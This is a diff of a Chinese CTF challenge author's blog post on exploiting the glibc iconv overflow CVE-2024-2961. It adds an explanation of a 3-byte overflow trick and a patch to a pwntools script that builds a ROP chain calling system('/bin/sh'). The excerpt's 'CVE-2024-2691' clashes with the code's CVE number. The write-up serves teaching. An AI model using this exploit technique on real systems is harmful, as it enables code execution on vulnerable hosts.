@@ -1,7 +1,7 @@
 ---
 title: 赛博杯新生赛 2024 - StackLogout 出题博客
 date: 2024/12/22 10:47:00
-updated: 2024/12/22 18:17:00
+updated: 2024/12/22 22:44:00
 tags:
     - cve
     - stack pivot
@@ -9,7 +9,9 @@ tags:
     - tricks
     - remote debugging
     - challenge author
-sticky: 97
+sticky: 90
+excerpt: 去年 4 月份左右 pankas 转发了一篇推文，讲 PHP 通杀的，我一看原文，竟然是 glibc 组件的 bug， 并且有 cve 编号。博客很详细，还更了整整 3 篇，不用调试就能看懂。自从看到 CVE-2024-2691 的缓冲区溢出，我就一直想着考上一题，这次趁着新生赛，它来了！
+thumbnail: /assets/cbctf2024/morebytes.png
 ---
 
 去年4月份左右 *pankas* 转发了一篇推文，讲PHP通杀的，我一看原文，竟然是glibc组件的bug，
@@ -40,12 +42,10 @@ sticky: 97
 ```c who.c
 #include <alloca.h>
 #include <iconv.h>
-#include <emmintrin.h>
 #include <stdio.h>
 #include <string.h>
 #include <unistd.h>
 #include <immintrin.h>
-#include <xmmintrin.h>
 
 void who(char *buf, unsigned long size) {
     __m128i zero = _mm_setzero_si128();
@@ -246,6 +246,43 @@ def payload(lo: int):
     sh.clean()
     sh.interactive()
     sh.close()
+```
+
+## Overflow more!
+
+可以注意到，原来的博客里说，可以溢出1-3字节，但是此刻我们只溢出了1字节，有没有办法能多溢出呢？
+答案是有的。众所周知，中文utf-8占3字节，但是gb2312只占2字节稍微研究一下这个编码可知，
+当字符集发生变换，从某个字面跳到某个未出现的字面时，会写入能溢出的4个控制字符，
+我称这个写入控制字符的过程为 **膨胀** 。同时，如果转换很多中文字符，那么在转换过程中则会发生
+**收缩** 。
+
+假设输入缓冲区和输出缓冲区一致，如果在末尾加一个中文字符，则会溢出4(控制字符)-3(utf-8中文)个字节，
+但是倘若我们先转换成中文，并加上大量一样的中文字，则会先膨胀再收缩，实现输出比输入短。
+此时再在后面添加一个其他字面的中文，就可以实现3字节溢出。如下图所示，末尾的控制字符超过输入缓冲区
+3字节，符合条件：
+
+![overflow more bytes](/assets/cbctf2024/morebytes.png)
+
+不难看到我在重新读入时`toread & 0x1f8`，倘若溢出了2-3字节，则可以溢出写更多字节，变成ret2libc了。
+不过由于`who`在退出时还会做一个memcpy，将`rbp - 0x40`位置的字节复制到`rbp + 0x10`，
+因此我们溢出的字节的结尾会被payload开头的一部分覆写，需要调整一下发送的payload。
+我把patch贴在这里，接下来怎么打ret2libc留给读者思考。
+
+```diff
+diff --git a/Pwn/StackLogout/StackLogout.py b/Pwn/StackLogout/StackLogout.py
+--- a/Pwn/StackLogout/StackLogout.py
++++ b/Pwn/StackLogout/StackLogout.py
+@@ -46,9 +46,9 @@ def payload(lo: int):
+     success(GOLD_TEXT(f"Leak canary: {canary:#x}"))
+
+     gadgets = ROP(libc)
+-    logout(b'Trigger CVE-2024-2961!!'.ljust(0x2d) + '劄'.encode(), False, False,
++    logout(b'Trigger CVE-2024-2961!!'.ljust(0x24) + '湿湿湿䂚'.encode(), False, False,
+              # system("bin/sh")
+         flat(gadgets.rdi.address, next(libc.search(b'/bin/sh')), libc.symbols['system'],
+              # _exit(0)
+              gadgets.rdi.address, 0, libc.symbols['_exit'],
+              0x48, canary, stack - 8))
 ```
 
 ## 参考
